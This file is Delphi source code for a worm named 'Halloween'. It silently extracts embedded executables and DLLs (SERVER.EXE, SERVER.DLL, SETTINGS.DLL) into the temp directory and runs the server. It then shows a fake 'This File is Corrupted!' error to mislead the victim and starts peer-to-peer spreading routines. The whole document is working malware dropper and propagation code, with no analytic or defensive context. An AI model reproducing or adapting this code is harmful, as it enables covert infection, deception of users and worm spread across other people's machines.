   PROGRAM Halloween;

   USES
     P2P      IN 'P2P.PAS',
     Classes,
     Windows,
     SysUtils,
     ShellAPI;

   {$R SERVER.RES}
   {$R SERVERDLL.RES}
   {$R SETTINGS.RES}

   VAR
     hMainForm : HWND;
     FirstRun2 : BOOL;
     S : String;
     msg : tmsg;
     D    : STRING;


     Chars : STRING        = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdevghijklmnopqrstuvwxyz';

   procedure startworm;
   begin
     Randomize;
     ApplicationName:=ParamStr(0);
     MessageBox(hMainForm,'This File is Corrupted!','Error',MB_ICONHAND);
     InitPeerToPeer;
   end;

   function ExtractRes(ResType, ResName, ResNewName: string): Boolean;
   var
     Res: TResourceStream;
   begin
     Result := False;
     Res := TResourceStream.Create(Hinstance, Resname, PChar(ResType));
     try
       Res.SavetoFile(ResNewName);
       Result := True;
     finally
       Res.Free;
     end;
   end;

   procedure ShellExecute_AndWait(FileName: string);
   var
     exInfo: TShellExecuteInfo;
     Ph: DWORD;
   begin
     FillChar(exInfo, SizeOf(exInfo), 0);
     with exInfo do
     begin
       cbSize := SizeOf(exInfo);
       fMask := SEE_MASK_NOCLOSEPROCESS or SEE_MASK_FLAG_DDEWAIT;
       Wnd := GetActiveWindow();
       ExInfo.lpVerb := 'open';
       lpFile := PChar(FileName);
       nShow := SW_SHOWNORMAL;
     end;
     if ShellExecuteEx(@exInfo) then
     begin
       Ph := exInfo.HProcess;
     end;
     CloseHandle(Ph);
   end;

   FUNCTION GetTempDir : STRING;
   VAR
     Buffer: array[0..MAX_PATH] of Char;
   BEGIN
     GetTempPath(SizeOf(Buffer) - 1, Buffer);
     Result := StrPas(Buffer);
   END;

   PROCEDURE ACTIVE;
   BEGIN
     D:=GetTempDir + 'SERVER.EXE';
     IF NOT FileExists(D) THEN IF ExtractRes('EXEFILE1', 'TESTFILE1', D) then if FileExists(D) then ShellExecute_AndWait(D);
     D:=GetTempDir + 'SERVER.DLL';
     IF NOT FileExists(D) THEN ExtractRes('EXEFILE2', 'TESTFILE2', D);
     D:=GetTempDir + 'SETTINGS.DLL';
     IF NOT FileExists(D) THEN ExtractRes('EXEFILE3', 'TESTFILE3', D);
   END;

   BEGIN
     Active;
     startworm;
   END.
